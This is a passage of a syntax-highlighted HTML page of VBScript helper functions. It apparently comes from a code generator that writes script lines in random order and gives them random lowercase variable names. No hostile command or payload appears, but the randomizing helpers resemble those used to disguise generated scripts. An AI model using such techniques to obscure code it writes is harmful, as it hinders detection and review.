    </span><span class="sc3">elseif</span><span class="sc0"> </span><span class="sc7">String1</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">and</span><span class="sc0"> </span><span class="sc7">String2</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc7">RandomAndAdd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">""</span><span class="sc0">
    </span><span class="sc3">else</span><span class="sc0">
        </span><span class="sc7">RandomAndAdd</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc4">"if "</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">String1</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">String2</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc4">" then"</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Function</span><span class="sc0">

</span><span class="sc1">'Inserts two strings in random order using AddCodeLine
'If String1 or String2 = "" it doesn't insert it
'ModTab = 0 to not modify tabbing
'ModTab = 1 to indent string2 if its placed below
'ModTab = 2 to indent string2 if its placed above
</span><span class="sc3">Sub</span><span class="sc0"> </span><span class="sc7">RandOrder</span><span class="sc6">(</span><span class="sc7">String1</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">String2</span><span class="sc6">,</span><span class="sc0"> </span><span class="sc7">ModTab</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0">
        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">String1</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">ModTab</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">String2</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">ModTab</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc3">else</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">ModTab</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">String2</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">ModTab</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">TabAmount</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc7">AddCodeLine</span><span class="sc0"> </span><span class="sc7">String1</span><span class="sc0">
    </span><span class="sc3">end</span><span class="sc0"> </span><span class="sc3">if</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">Sub</span><span class="sc0">

</span><span class="sc1">'Returns the value of the chosen radio button within a radio button array
</span><span class="sc3">Function</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc6">(</span><span class="sc7">ArrList</span><span class="sc6">)</span><span class="sc0">
    </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc6">(</span><span class="sc7">ArrList.length</span><span class="sc0"> </span><span class="sc6">-</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc3">if</span><span class="sc0"> </span><span class="sc7">ArrList</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">).</span><span class="sc7">Checked</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc3">True</span><span class="sc0"> </span><span class="sc3">then</span><span class="sc0"> </span><span class="sc7">GetVals</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">ArrList</span><span class="sc6">(</span><span class="sc7">i</span><span class="sc6">).</span><span class="sc7">Value</span><span class="sc0">
    </span><span class="sc3">next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc3">function</span><span class="sc0">

</span><span class="sc1">'Generates a random stream of lower case characters
</span><span class="sc3">function</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0">
    </span><span class="sc3">for</span><span class="sc0"> </span><span class="sc7">i</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0"> </span><span class="sc3">to</span><span class="sc0"> </span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">10</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc6">)</span><span class="sc0">
        </span><span class="sc7">GenVar</span><span class="sc0"> </span><span class="sc6">=</span><span class="sc0"> </span><span class="sc7">GenVar</span><span class="sc0"> </span><span class="sc6">&amp;</span><span class="sc0"> </span><span class="sc7">Chr</span><span class="sc6">(</span><span class="sc10">Int</span><span class="sc6">((</span><span class="sc2">26</span><span class="sc0"> </span><span class="sc6">*</span><span class="sc0"> </span><span class="sc7">Rnd</span><span class="sc6">)</span><span class="sc0"> </span><span class="sc6">+</span><span class="sc0"> </span><span class="sc2">97</span><span class="sc6">))</span><span class="sc0">
    </span><span class="sc3">next</span><span class="sc0">
</span><span class="sc3">End</span><span class="sc0"> </span><span class="sc7">Function</span></div></body>
</html>
